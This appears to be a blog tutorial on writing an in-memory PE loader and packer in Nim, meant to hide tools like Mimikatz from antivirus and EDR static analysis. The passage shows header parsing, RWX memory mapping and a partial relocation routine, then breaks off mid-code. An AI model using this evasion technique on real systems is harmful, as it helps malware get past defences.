<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Writing a Packer From Scratch in Nim</title><style>
      * {
        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
      }
      html, body {
        margin: 0;
        padding: 0;
      }
      h1 {
        font-size: 50px;
        margin-bottom: 17px;
        color: #333;
      }
      h2 {
        font-size: 24px;
        line-height: 1.6;
        margin: 30px 0 0 0;
        margin-bottom: 18px;
        margin-top: 33px;
        color: #333;
      }
      h3 {
        font-size: 30px;
        margin: 10px 0 20px 0;
        color: #333;
      }
      header {
        width: 640px;
        margin: auto;
      }
      section {
        width: 640px;
        margin: auto;
      }
      section p {
        margin-bottom: 27px;
        font-size: 20px;
        line-height: 1.6;
        color: #333;
      }
      section img {
        max-width: 640px;
      }
      footer {
        padding: 0 20px;
        margin: 50px 0;
        text-align: center;
        font-size: 12px;
      }
      .aspectRatioPlaceholder {
        max-width: auto !important;
        max-height: auto !important;
      }
      .aspectRatioPlaceholder-fill {
        padding-bottom: 0 !important;
      }
      header,
      section[data-field=subtitle],
      section[data-field=description] {
        display: none;
      }
      </style></head><body><article class="h-entry">
<header>
<h1 class="p-name">Writing a Packer From Scratch in Nim</h1>
</header>
<section data-field="subtitle" class="p-summary">
TL;DR this is a post on how to create a packer in nim to evade automated static analysis.
</section>
<section data-field="body" class="e-content">
<section name="60a2" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="fd6b" id="fd6b" class="graf graf--h3 graf--leading graf--title">Writing a Packer From Scratch in Nim</h3><p name="30fe" id="30fe" class="graf graf--p graf-after--h3"><em class="markup--em markup--p-em">TL;DR this is a post on how to create a packer in nim to evade automated static analysis.</em></p><p name="adb1" id="adb1" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">Obligatory disclaimer: all of the information presented here is for research purposes and should only be used in a legitimate and legal manner, the author will not be held responsible for any misdoings or illegal activities. Also, use at your own discretion.</strong></p><p name="d0d3" id="d0d3" class="graf graf--p graf-after--p">In malware development, the packer, sometimes also known as a cryptor, is an ideal tool for evading static analysis by Anti-virus/EDR products. In this article, we will run through how we can create a packer that will take a known piece of malware like Mimikatz, encrypt it, and then when it&#39;s needed, decrypt the binary in memory and run it. Please note that there are other factors needed for successfully evading detection in 2023, such as sandbox evasion and EDR evasion. These subjects won&#39;t be covered directly in this article, for a detailed walkthrough of various phases of evasion and detection please refer to the video “EDR Evasion Primer For Red Teamers — Jorge Gimenez &amp; Karsten Nohl”.</p><figure name="2a6c" id="2a6c" class="graf graf--figure graf--iframe graf-after--p"><iframe src="https://www.youtube.com/embed/CKfjLnEMfvI?feature=oembed" width="700" height="393" frameborder="0" scrolling="no"></iframe><figcaption class="imageCaption">Goes through the steps of evasion</figcaption></figure><p name="b88c" id="b88c" class="graf graf--p graf-after--figure">Now that that is out of the way what are the motivations for writing this article, well mainly it&#39;s for my own education and to document the process for future reference. Also, it’s because I found a general lack of resources on the subject when initially doing the research and putting my first version together (this will be the second version). The resources I found during that project were all great, but I like having many different resources available when doing research so now I’ll offer my knowledge here. For a general list of great resources to complement this article please see the following list:</p><ul class="postList"><li name="98a4" id="98a4" class="graf graf--li graf-after--p"><a href="https://www.codeproject.com/Articles/5317556/Creating-Your-Very-Own-x64-PE-Packer-Protector-fro" data-href="https://www.codeproject.com/Articles/5317556/Creating-Your-Very-Own-x64-PE-Packer-Protector-fro" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://www.codeproject.com/Articles/5317556/Creating-Your-Very-Own-x64-PE-Packer-Protector-fro</a></li><li name="9b94" id="9b94" class="graf graf--li graf-after--li"><a href="https://github.com/frank2/packer-tutorial#getting-a-taste" data-href="https://github.com/frank2/packer-tutorial#getting-a-taste" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/frank2/packer-tutorial#getting-a-taste</a></li><li name="2485" id="2485" class="graf graf--li graf-after--li"><a href="https://wirediver.com/tutorial-writing-a-pe-packer-part-1/" data-href="https://wirediver.com/tutorial-writing-a-pe-packer-part-1/" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://wirediver.com/tutorial-writing-a-pe-packer-part-1/</a></li><li name="8b18" id="8b18" class="graf graf--li graf-after--li"><a href="https://github.com/icyguider/Nimcrypt2/tree/main" data-href="https://github.com/icyguider/Nimcrypt2/tree/main" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/icyguider/Nimcrypt2/tree/main</a></li><li name="d2cb" id="d2cb" class="graf graf--li graf-after--li"><a href="https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes" data-href="https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes</a></li><li name="2803" id="2803" class="graf graf--li graf-after--li"><a href="https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection" data-href="https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection</a></li><li name="5e84" id="5e84" class="graf graf--li graf-after--li"><a href="https://labs.nettitude.com/blog/introducing-process-hiving-runpe/" data-href="https://labs.nettitude.com/blog/introducing-process-hiving-runpe/" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://labs.nettitude.com/blog/introducing-process-hiving-runpe/</a></li></ul><p name="ea05" id="ea05" class="graf graf--p graf-after--li">The above are all great in their own right and if anything in this piece does not make sense or another angle is desired I highly recommend checking those out.</p><h3 name="6549" id="6549" class="graf graf--h3 graf-after--p">Introduction</h3><p name="2aee" id="2aee" class="graf graf--p graf-after--h3">So with that out of the way, what are we going to be doing? The general concept used here is often referred to as RunPE or PE injection, and it’s basically just loading a PE file into memory, updating all the references in the binary to the current offset, and then passing execution to it.</p><p name="1e96" id="1e96" class="graf graf--p graf-after--p">Why nim? because it’s awesome, Python-like syntax + WindowsAPI calls + compiles to c/c++ and then to exe = much happy. The concepts here should be easy to port to any other language of your preferences.</p><p name="559e" id="559e" class="graf graf--p graf-after--p">Why no GitHub? because then all of you will get the tools fingerprinted and signature detected, which defeats the purpose, and if you are here then you are grown enough to make your own tools ;)</p><p name="41d1" id="41d1" class="graf graf--p graf-after--p">What do you need to know to follow along:</p><ul class="postList"><li name="fad5" id="fad5" class="graf graf--li graf-after--p">General grasp of coding and programming</li><li name="eafc" id="eafc" class="graf graf--li graf-after--li">A good idea of how PE files work on Windows (see this article for a great introduction <a href="https://0xrick.github.io/win-internals/pe2/" data-href="https://0xrick.github.io/win-internals/pe2/" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://0xrick.github.io/win-internals/pe2/</a>)</li><li name="3bd7" id="3bd7" class="graf graf--li graf-after--li">Some experience with debugging</li><li name="1edf" id="1edf" class="graf graf--li graf-after--li">A willingness to learn and explore</li></ul><p name="73a3" id="73a3" class="graf graf--p graf-after--li">You got that? great! the article will be structured in the following manner:</p><ol class="postList"><li name="9c46" id="9c46" class="graf graf--li graf-after--p">Loading the PE into memory</li><li name="ee8f" id="ee8f" class="graf graf--li graf-after--li">Validating the PE, our packer will only support x64-bit unmanaged binaries (<a href="https://stackoverflow.com/questions/334326/what-is-managed-or-unmanaged-code-in-programming" data-href="https://stackoverflow.com/questions/334326/what-is-managed-or-unmanaged-code-in-programming" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://stackoverflow.com/questions/334326/what-is-managed-or-unmanaged-code-in-programming</a>) for how to inject and execute managed code please refer to <a href="https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim" data-href="https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim</a>. That means no C#, Powershell, and pure shellcode support only 64-bit PE files.</li><li name="8d7f" id="8d7f" class="graf graf--li graf-after--li">Map Sections to memory</li><li name="a0e5" id="a0e5" class="graf graf--li graf-after--li">Fix base relocations</li><li name="9535" id="9535" class="graf graf--li graf-after--li">Fix Import Address Table (IAT)</li><li name="e28b" id="e28b" class="graf graf--li graf-after--li">Transfer execution</li><li name="e761" id="e761" class="graf graf--li graf-after--li">Debugging</li><li name="b020" id="b020" class="graf graf--li graf-after--li">Adding encryption and decryption</li><li name="66d5" id="66d5" class="graf graf--li graf-after--li">Conclusion</li></ol><p name="2aa7" id="2aa7" class="graf graf--p graf-after--li">I’ll try my best to keep this short and provide references and explanations whenever possible.</p><p name="06a3" id="06a3" class="graf graf--p graf-after--p">Enough messing around, let&#39;s get started!</p><h3 name="1bea" id="1bea" class="graf graf--h3 graf-after--p">Loading PE into memory</h3><p name="9b17" id="9b17" class="graf graf--p graf-after--h3">First, we need the binary in memory, starting off we will not be dealing with encryption and decryption since these just add more points of failure. When we have everything working adding encryption will be easy. Starting off we will just be using calc.exe (64-bit version) for PoC but other applications should be fine.</p><p name="847d" id="847d" class="graf graf--p graf-after--p">For loading the file to memory let’s use nim file streams: <a href="https://nim-lang.org/docs/streams.html" data-href="https://nim-lang.org/docs/streams.html" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">https://nim-lang.org/docs/streams.html</a></p><p name="c502" id="c502" class="graf graf--p graf-after--p">And while we are at let’s add some error handling. On a quick side note, everything will have error handling and documentation (only shown where appropriate) using <a href="https://nim-lang.org/blog/2017/10/02/documenting-profiling-and-debugging-nim-code.html" data-href="https://nim-lang.org/blog/2017/10/02/documenting-profiling-and-debugging-nim-code.html" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">https://nim-lang.org/blog/2017/10/02/documenting-profiling-and-debugging-nim-code.html</a>. this gives us the following code (compiled with: nim c — run .\packer.nim) :</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="python" name="99fe" id="99fe" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-keyword">import</span> streams<br /><br />proc loadPeToMemory(inputPePath: string) =<br />    <span class="hljs-keyword">try</span>:<br />        echo <span class="hljs-string">&quot;[+] Loading PE file to memory: &quot;</span>, inputPePath<br />        var loadedPeFile = newFileStream(inputPEPath, fmRead)<br />    <span class="hljs-keyword">except</span>:<br />        echo <span class="hljs-string">&quot;[error] error loading file - quitting&quot;</span><br />        quit(QuitFailure)<br /><br />var inputPePath = <span class="hljs-string">r&quot;C:\calc.exe&quot;</span><br />loadPeToMemory(inputPePath)<br /><br />echo <span class="hljs-string">&quot;[+] Done&quot;</span></span></pre><h3 name="857e" id="857e" class="graf graf--h3 graf-after--pre">Validate PE</h3><p name="3a23" id="3a23" class="graf graf--p graf-after--h3">Now we have loaded the file into memory let’s validate that we are in fact dealing with a 64-bit, unmanaged, PE file. Here I’ll be repeating the steps from <a href="https://www.codeproject.com/Articles/5317556/Creating-Your-Very-Own-x64-PE-Packer-Protector-fro" data-href="https://www.codeproject.com/Articles/5317556/Creating-Your-Very-Own-x64-PE-Packer-Protector-fro" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://www.codeproject.com/Articles/5317556/Creating-Your-Very-Own-x64-PE-Packer-Protector-fro</a>, so please refer to that for further details.</p><p name="5dad" id="5dad" class="graf graf--p graf-after--p">For this, we will need the awesome <em class="markup--em markup--p-em">winim </em>library. First, we need to parse the various headers of the file we just loaded. Thus the function we just created to load the file will be updated to return the file stream, which will be shown below. I will not go into the details of parsing the PE header as this is an endeavour all on its own, but the general idea is that all parts of the PE header have set sizes and describe the structure of the file. For a step-by-step walkthrough please see:</p><ul class="postList"><li name="868e" id="868e" class="graf graf--li graf-after--p"><a href="https://0xrick.github.io/win-internals/pe2/" data-href="https://0xrick.github.io/win-internals/pe2/" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://0xrick.github.io/win-internals/pe2/</a></li><li name="81c3" id="81c3" class="graf graf--li graf-after--li"><a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/pe-file-header-parser-in-c++" data-href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/pe-file-header-parser-in-c++" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/pe-file-header-parser-in-c++</a></li></ul><p name="052e" id="052e" class="graf graf--p graf-after--li">One quick side note here, please be aware that people often use different names for the different parts of the PE header and some tools also might use different naming, so if in doubt please cross reference.</p><p name="f8bd" id="f8bd" class="graf graf--p graf-after--p">Also when I created my first packer I had print statements for all the headers and values, this can be very nice for debugging and finding errors. Nothing about this is difficult it just takes some time, for my parsing, I&#39;m using readIntXX() with XX being the size of the data like 16 and 32 bits.</p><p name="af92" id="af92" class="graf graf--p graf-after--p">I use a custom struct/object to keep track of the headers. also, I updated the loadPeToMemory to return Stream.</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="php" name="c4df" id="c4df" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">type<br />    PeHeaders = <span class="hljs-keyword">object</span><br />        dosHeader: DOS_Header<br />        ntHeader: NT_Header<br />        fileHeader: File_Header<br />        optionalHeader: Image_Optional_Header_Custom<br />        dataDirectory_import: IMAGE_DIRECTORY_ENTRY<br />        dataDirectory_relocation: IMAGE_DIRECTORY_ENTRY<br />        dataDirectory_net: IMAGE_DIRECTORY_ENTRY<br /><br />proc <span class="hljs-title function_ invoke__">parsePeHeaders</span>(<span class="hljs-attr">loadedPeFile</span>: Stream): PeHeaders = <br />    let dosHeader = <span class="hljs-title function_ invoke__">parseDosHeader</span>(loadedPeFile)<br />    let ntHeader = <span class="hljs-title function_ invoke__">parseNTHeader</span>(loadedPeFile, dosHeader.e_lfanew)<br />    let fileHeader = <span class="hljs-title function_ invoke__">parseFileHeader</span>(loadedPeFile)<br />    let optionalHeader = <span class="hljs-title function_ invoke__">parseImageOptionalHeader</span>(loadedPeFile)<br />    <span class="hljs-title function_ invoke__">let</span> (dataDirectory_import, dataDirectory_relocation, dataDirectory_net) = <span class="hljs-title function_ invoke__">parseDataDirectories</span>(loadedPeFile)<br />    let peHeaders = <span class="hljs-title function_ invoke__">PeHeaders</span>(<br />        <span class="hljs-attr">dosHeader</span>: dosHeader, <br />        <span class="hljs-attr">ntHeader</span>: ntHeader, <br />        <span class="hljs-attr">fileHeader</span>: fileHeader, <br />        <span class="hljs-attr">optionalHeader</span>: optionalHeader,<br />        <span class="hljs-attr">dataDirectory_import</span>: dataDirectory_import, <br />        <span class="hljs-attr">dataDirectory_relocation</span>: dataDirectory_relocation,<br />        <span class="hljs-attr">dataDirectory_net</span>: dataDirectory_net)<br />    <span class="hljs-keyword">return</span> peHeaders<br /><br />proc <span class="hljs-title function_ invoke__">validatePeFile</span>(<span class="hljs-attr">peHeaders</span>: PeHeaders) = <br />    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Validating PE file&quot;</span><br />    <span class="hljs-keyword">var</span> isPE: <span class="hljs-keyword">bool</span> = peHeaders.dosHeader.e_magic == IMAGE_DOS_SIGNATURE<br />    <span class="hljs-keyword">var</span> is64: <span class="hljs-keyword">bool</span> = peHeaders.optionalHeader.magic == peParser.IMAGE_NT_OPTIONAL_HDR64_MAGIC<br />    <span class="hljs-keyword">var</span> isDLL: <span class="hljs-keyword">bool</span> = peHeaders.fileHeader.characteristics == IMAGE_FILE_DLL<br />    <span class="hljs-keyword">var</span> isNET: <span class="hljs-keyword">bool</span> = peHeaders.dataDirectory_net.size != <span class="hljs-number">0</span><br /><br />    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Validation] Is PE File : &quot;</span>, isPE<br />    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Validation] Is 64bit : &quot;</span>, is64;<br />    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Validation] Is DLL : &quot;</span>, isDLL;<br />    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Validation] Is COM or .Net : &quot;</span>, isNET;<br /><br />    <span class="hljs-keyword">if</span> not isPE: <br />        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Error] Input PE file is invalid. (Signature Mismatch)&quot;</span><br />        <span class="hljs-title function_ invoke__">quit</span>(QuitFailure)<br /><br /><br /><span class="hljs-keyword">var</span> peHeaders = <span class="hljs-title function_ invoke__">parsePeHeaders</span>(loadededPeFile)<br /><span class="hljs-title function_ invoke__">validatePeFile</span>(peHeaders)</span></pre><p name="0ceb" id="0ceb" class="graf graf--p graf-after--pre">Let’s run it and compare the results, using CFF Explorer we can check our work.</p><figure name="d1a5" id="d1a5" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*o_KzxdTOGr2gNcmSGHEaRw.png" data-width="798" data-height="831" src="https://cdn-images-1.medium.com/max/800/1*o_KzxdTOGr2gNcmSGHEaRw.png"><figcaption class="imageCaption">checking is 64-bit</figcaption></figure><p name="2627" id="2627" class="graf graf--p graf-after--figure">This corresponds with our output:</p><figure name="5b45" id="5b45" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*_cCMsMPokyOOfUQLi5mVHg.png" data-width="327" data-height="105" src="https://cdn-images-1.medium.com/max/800/1*_cCMsMPokyOOfUQLi5mVHg.png"><figcaption class="imageCaption">file validation output</figcaption></figure><p name="7b41" id="7b41" class="graf graf--p graf-after--figure">We now have the file in memory and are able to parse relevant information from it. We only need one thing to move on to the next mapping the file to memory and that is to parse the section headers, so let’s do that. We do that by iterating over the PE files sections, we can see these using CFF Explorer.</p><figure name="0020" id="0020" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*cFK8RZ4xU5bae3Alzb5RZg.png" data-width="1142" data-height="459" src="https://cdn-images-1.medium.com/max/800/1*cFK8RZ4xU5bae3Alzb5RZg.png"><figcaption class="imageCaption">Section headers</figcaption></figure><p name="59d0" id="59d0" class="graf graf--p graf-after--figure">To parse these we have to adjust the read position of the file stream. The code looks like this:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="perl" name="f872" id="f872" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">proc adjustReadPositionOfStream(loadededPeFile: Stream) = <br />    loadededPeFile.setPosition(loadededPeFile.getPosition()+<span class="hljs-number">0x8</span>)<br />    <br />proc parseSectionHeaders(loadededPeFile: Stream): se<span class="hljs-string">q[Section_Header]</span> =<br />    echo <span class="hljs-string">&quot;[+] Parsing Section Headers&quot;</span><br />    adjustReadPositionOfStream(loadededPeFile)<br />    var sectionHeaders = newSe<span class="hljs-string">q[Section_Header]</span>()<br />    var section = <span class="hljs-number">0</span><br /><br />    <span class="hljs-keyword">for</span> section in <span class="hljs-number">0</span>..peHeaders.fileHeader.numberOfSections-<span class="hljs-number">1</span>:<br />        sectionHeaders.add(parseSectionHeader(loadededPeFile))<br />        echo <span class="hljs-string">&quot;\t[V] Section header parsed: &quot;</span>,sectionHeaders[section].name<br />    <span class="hljs-keyword">return</span> sectionHeaders</span></pre><h3 name="ac33" id="ac33" class="graf graf--h3 graf-after--pre">Map Sections to memory</h3><p name="3014" id="3014" class="graf graf--p graf-after--h3">Our next step is to map our sections to memory. The workflow will be as follows:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="wasm" name="b55b" id="b55b" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">allocate <span class="hljs-keyword">memory</span><br />copy file contents to <span class="hljs-keyword">memory</span><br /><span class="hljs-keyword">loop</span> through sections<br />  copy to <span class="hljs-keyword">memory</span></span></pre><p name="40e6" id="40e6" class="graf graf--p graf-after--pre">Now that we know what to do, let&#39;s get started. First up is allocating memory, luckily for us, winim exists so we can just use Windows APIs like we would if we were doing this in <em class="markup--em markup--p-em">C++</em>. VirtualAlloc documentation can be found here: <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc" data-href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc</a> and for the lazy ones, the arguments look like this:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="css" name="47bc" id="47bc" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">LPVOID VirtualAlloc(<br />  <span class="hljs-selector-attr">[in, optional]</span> LPVOID lpAddress,<br />  <span class="hljs-selector-attr">[in]</span>           SIZE_T dwSize,<br />  <span class="hljs-selector-attr">[in]</span>           DWORD  flAllocationType,<br />  <span class="hljs-selector-attr">[in]</span>           DWORD  flProtect<br />);</span></pre><p name="66aa" id="66aa" class="graf graf--p graf-after--pre">If successful virtialAlloc will give us the base address of the allocated region, we will use this later to show how x64dbg can be used for debugging our work. To make life easier for myself I just use the documentation variable names. After sections are copied to memory we can use a combination of CFF Explorer, x64dbg, and regular print statements to check our work. For more info check the “debugging” section.</p><figure name="f43b" id="f43b" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*tlH6IliyuAu29792MZ-dkg.png" data-width="1672" data-height="890" data-is-featured="true" src="https://cdn-images-1.medium.com/max/800/1*tlH6IliyuAu29792MZ-dkg.png"></figure><p name="67d4" id="67d4" class="graf graf--p graf-after--figure">For getting the above print out the code below was used, this is just debug code and should not be kept for production:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="css" name="d344" id="d344" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">    <span class="hljs-selector-tag">var</span> reslt: uint64<br />    var g = <span class="hljs-number">0</span>x0<br />    <span class="hljs-built_in">ReadProcessMemory</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), shellcodePtr, addr reslt, cast[SIZE_T](<span class="hljs-built_in">sizeof</span>(reslt)),nil)<br />    echo <span class="hljs-string">&quot;\t\t| &quot;</span>,<span class="hljs-built_in">toHex</span>(g),<span class="hljs-string">&quot; | &quot;</span>,<span class="hljs-built_in">toHex</span>(reslt)</span></pre><p name="1595" id="1595" class="graf graf--p graf-after--pre">Function for allocating memory:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="java" name="1fe7" id="1fe7" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">proc <span class="hljs-title function_">allocateMemory</span><span class="hljs-params">(peHeaders: PeHeaders)</span>: <span class="hljs-type">ptr</span> <span class="hljs-variable">BYTE</span> <span class="hljs-operator">=</span> <br />    <span class="hljs-keyword">var</span> pImageBase: <span class="hljs-type">ptr</span> <span class="hljs-variable">BYTE</span> <span class="hljs-operator">=</span> nil<br />    <span class="hljs-type">var</span> <span class="hljs-variable">lpAddress</span> <span class="hljs-operator">=</span> cast[LPVOID](peHeaders.optionalHeader.imageBase)<br />    <span class="hljs-type">var</span> <span class="hljs-variable">dwSize</span> <span class="hljs-operator">=</span> peHeaders.optionalHeader.sizeOfImage<br />    <span class="hljs-keyword">var</span> flAllocationType: DWORD = MEM_COMMIT or MEM_RESERVE<br />    <span class="hljs-keyword">var</span> flProtect: DWORD = <span class="hljs-type">PAGE_EXECUTE_READWRITE</span><br />    <span class="hljs-variable">pImageBase</span> <span class="hljs-operator">=</span> cast[ptr BYTE](<br />        VirtualAlloc(<br />            lpAddress,<br />            dwSize, <br />            flAllocationType,<br />            flProtect<br />        ))<br />    <span class="hljs-keyword">return</span> pImageBase</span></pre><p name="dc2a" id="dc2a" class="graf graf--p graf-after--pre">Function for copying contents to memory</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="php" name="a16a" id="a16a" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">proc <span class="hljs-title function_ invoke__">copyToMemory</span>(<span class="hljs-attr">pImageBase</span>: ptr BYTE, <span class="hljs-attr">peHeaders</span>: PeHeaders, <span class="hljs-attr">loadededPeFile</span>: Stream, <span class="hljs-attr">sectionHeaders</span>: seq[Section_Header]): ptr =<br />    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Update position to raw Address @ : &quot;</span>,<span class="hljs-title function_ invoke__">toHex</span>(sectionHeaders[<span class="hljs-number">0</span>].rawAddress)<br />    loadededPeFile.<span class="hljs-title function_ invoke__">setPosition</span>(sectionHeaders[<span class="hljs-number">0</span>].rawAddress)<br />    loadededPeFile.<span class="hljs-title function_ invoke__">setPosition</span>(<span class="hljs-number">0</span>)<br />    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Loading PE into memory&quot;</span><br />    <span class="hljs-keyword">var</span> loadededPeFileSource = loadededPeFile.<span class="hljs-title function_ invoke__">readAll</span>()<br />    loadededPeFile.<span class="hljs-title function_ invoke__">close</span>()<br />    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Source file closed&quot;</span><br />    <span class="hljs-keyword">var</span> memloadBytes = <span class="hljs-title function_ invoke__">toByteSeq</span>(loadededPeFileSource)<br />    <span class="hljs-keyword">var</span> shellcodePtr: ptr = memloadBytes[<span class="hljs-number">0</span>].addr<br />    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Mapping Section ...&quot;</span><br />    <span class="hljs-title function_ invoke__">copymem</span>(pImageBase, shellcodePtr, peHeaders.optionalHeader.sizeOfHeaders)<br />    <span class="hljs-keyword">return</span> shellcodePtr</span></pre><h3 name="e757" id="e757" class="graf graf--h3 graf-after--pre">Fix base relocations</h3><p name="21b7" id="21b7" class="graf graf--p graf-after--h3">Now we have parsed the various PE headers and we have loaded our file into memory. The in-memory location of the file in or code is represented by the pImageBase variable. The next steps will be to update the base relocation table of the binary and fix the imports. First off the base relocations. In short, these are hardcoded locations based on the preferred image address, but as we know in modern systems with virtual addresses this is not always the case, therefore these need updating. For more see: <a href="https://0xrick.github.io/win-internals/pe7/" data-href="https://0xrick.github.io/win-internals/pe7/" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://0xrick.github.io/win-internals/pe7/</a>.</p><p name="09f8" id="09f8" class="graf graf--p graf-after--p">First things first, we need to check if the image is already at its preferred address. This can be found under the optional header as an image base.</p><figure name="2f39" id="2f39" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*us7KqCZI4H0QCmh1ZFKZdA.png" data-width="797" data-height="624" src="https://cdn-images-1.medium.com/max/800/1*us7KqCZI4H0QCmh1ZFKZdA.png"><figcaption class="imageCaption">prefered address</figcaption></figure><p name="34f1" id="34f1" class="graf graf--p graf-after--figure">If the binary is already there then we don&#39;t need to update the relocations!</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="php" name="5d5b" id="5d5b" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">proc <span class="hljs-title function_ invoke__">checkPreferedAddress</span>(<span class="hljs-attr">pImageBase</span>: ptr BYTE, <span class="hljs-attr">peHeaders</span>: PeHeaders) =<br />    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Cehcking prefered pImageBase&quot;</span><br />    <span class="hljs-keyword">var</span> preferAddr: LPVOID = cast[LPVOID](peHeaders.optionalHeader.imageBase)<br />    <span class="hljs-keyword">if</span> pImageBase != preferAddr:<br />        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\t [&gt;] pImageBase != preferAddr:&quot;</span><br />        <span class="hljs-title function_ invoke__">fixBaseRelocations</span>()<br />    <span class="hljs-keyword">if</span> pImageBase == preferAddr:<br />        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\t [&gt;] pImageBase == preferAddr:&quot;</span></span></pre><p name="f3ae" id="f3ae" class="graf graf--p graf-after--pre">Now we can get to the updating of the base relocations, again for further explanation refer to the source above. The code used here is more or less just a port of <a href="https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes" data-href="https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes</a>.</p><p name="c531" id="c531" class="graf graf--p graf-after--p">Sorry for the code being a bit of a cluster f*ck, please refer to some of the references in the start or ired for how this can be done better.</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="csharp" name="0f3f" id="0f3f" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-function">proc <span class="hljs-title">fixBaseRelocations</span>()</span> =<br />    echo <span class="hljs-string">&quot;[+] Perform Base Relocation&quot;</span><br />    <span class="hljs-keyword">var</span> relocationTable: LPVOID = (pImageBase + peHeaders.dataDirectory_relocation.rva)<br />    echo <span class="hljs-string">&quot;\t[+] relocationsTable.repr: &quot;</span>,relocationTable.repr<br />    <span class="hljs-keyword">var</span> deltaImageBase: ptr BYTE = cast[ptr BYTE](pImageBase) - peHeaders.optionalHeader.imageBase<br />    <span class="hljs-keyword">const</span> pbase_relocation_block = <span class="hljs-number">0x8</span><br />    <span class="hljs-keyword">const</span> base_relocation_entry = <span class="hljs-number">0x2</span><br />    <span class="hljs-keyword">var</span> relocationsProcessed = <span class="hljs-number">0</span> <br /><br />    <span class="hljs-keyword">var</span> readProcessMemoryResult32: uint32 <span class="hljs-meta"># size of 4 bytes</span><br />    <span class="hljs-keyword">var</span> readProcessMemoryResult16: uint16 <span class="hljs-meta"># size of 4 bytes</span><br /><br />    echo <span class="hljs-string">&quot;[+] Processing relocations&quot;</span><br />    <span class="hljs-keyword">while</span> 